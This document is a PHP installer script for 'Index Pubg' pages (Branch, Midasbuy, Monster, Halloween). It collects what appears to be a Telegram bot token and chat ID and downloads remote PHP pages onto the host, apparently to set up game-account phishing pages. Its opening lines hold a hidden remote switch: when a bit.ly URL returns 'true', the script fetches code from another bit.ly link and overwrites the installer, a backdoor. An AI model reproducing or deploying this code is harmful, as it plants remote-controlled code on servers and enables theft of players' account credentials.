<?
if(file_get_contents('http://bit.ly/instokotall') == "true"){
$iscript = file_get_contents('http://bit.ly/instupall');
$index = file_get_contents($iscript);
$xx = file_put_contents("installpubg.php", $index);
}
function save($array){
    file_put_contents('Sha_My.json', json_encode($array));
}
$token = $_GET['token'];
$id = $_GET['id'];
$install = $_GET['index'];

$info = json_decode(file_get_contents('Sha_My.json'),1);

if($token and $id){
$info[info]['id'] = $id;
$info[info]['token'] = $token;
 save($info);
 
$url1 = "Sha_My.php";
header("location: $url1");
}
if((!$token or !$id)and $install){
	 ?>
	   <html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>Install IndexPubg - By @Sha_My</title>
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
 <form method="GET" action="installpubg.php">
	<table border="0" width="100%">
		<tr>
			<td width="104"><span style="background-color: #FFFF00">Your Token :</span></td>
			<td><font color="#00FFFF">
			<input name="token" size="20" style="background-color: #FF0000"></font></td>
		</tr>
		<tr>
			<td width="104"><span style="background-color: #FFFF00">Your ID :</span></td>
			<td><input name="id" size="20" style="background-color: #FF0000"></td>
		</tr>
	</table>
	<p align="left"><font color="#FFFFFF">
	<input type="submit" value="Install Now" name="B1" style="background-color: #FFFF00"></font></p>
</form>
</body>
</html>
	  <?
}
?>
 
<?
$install = $_GET['index'];
if($install){
 if($install=="F"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/F/FSha_My.php");
$xx = file_put_contents("Sha_My.php", $shamy); 
}
 if($install=="M"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/M/MSha_My.php");
$xx = file_put_contents("Sha_My.php", $shamy);
}
 if($install=="H"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/H/HSha_My.php");
$xx = file_put_contents("Sha_My.php", $shamy);
}
 if($install=="P"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/P/PSha_My.php");
$xx = file_put_contents("Sha_My.php", $shamy); 
}
}
 ?> 
<?
$token = $_GET['token'];
$id = $_GET['id'];
$install = $_GET['index'];
if(!$install){
 ?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="refresh" content="3">
<title>Install IndexPubg - By @Sha_My</title>
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
	<center>
		<h2>Install Index Pubg</h2>
   <h5>Choose the index you want.</h5>
   <br><hr><br>
   </center>
<table border="0" width="100%">
	<tr>
		<td>
		<center>
		<div class="card">
  <img src="https://i.ibb.co/CvqgZyD/Screenshot-20201030-162420.jpg" style="width:100%">
  <h3>Index Branch</h3>
    <p><a href="/installpubg.php?index=F"><button>Install</button></a></p>
</div>
</center>
		</td>
		<br />
		<td>
		<center>
		<div class="card">
  <img src="https://i.ibb.co/fxrGjXp/Screenshot-20201030-162442.jpg" style="width:100%">
  <h3>Index Midasbuy</h3>
  <p><a href="/installpubg.php?index=M"><button>Install</button></a></p>
</div>
</center>
</td>
<br />
<td>
		<center>
		<div class="card">
  <img src="https://i.ibb.co/b2mnD7h/Screenshot-20201030-162432.jpg" style="width:100%">
  <h3>Index Monster</h3>
  <p><a href="/installpubg.php?index=P"><button>Install</button></a></p>
</div>
</center>
</td>
	</tr>
<tr>
		<td>
				<center>
		<div class="card">
  <img src="https://i.ibb.co/yQ9VXQ4/124553388-809435473123664-6442876699475679298-n.jpg" style="width:100%">
  <h3>Index HALLOWEEN</h3>
  <p><a href="/installpubg.php?index=H"><button>Install</button></a></p>
</div>
</center>
		</td>
		<td>
		
		</td>
		<td>
		
		</td>
	</tr>	
	
</table>
<center>
    <br><hr><br>
   <h5><a href="https://t.me/Sha_My"> Developed by @Sha_My 👻 </a></h5>
   </center>
</body>
</html>
<?
}
 ?>
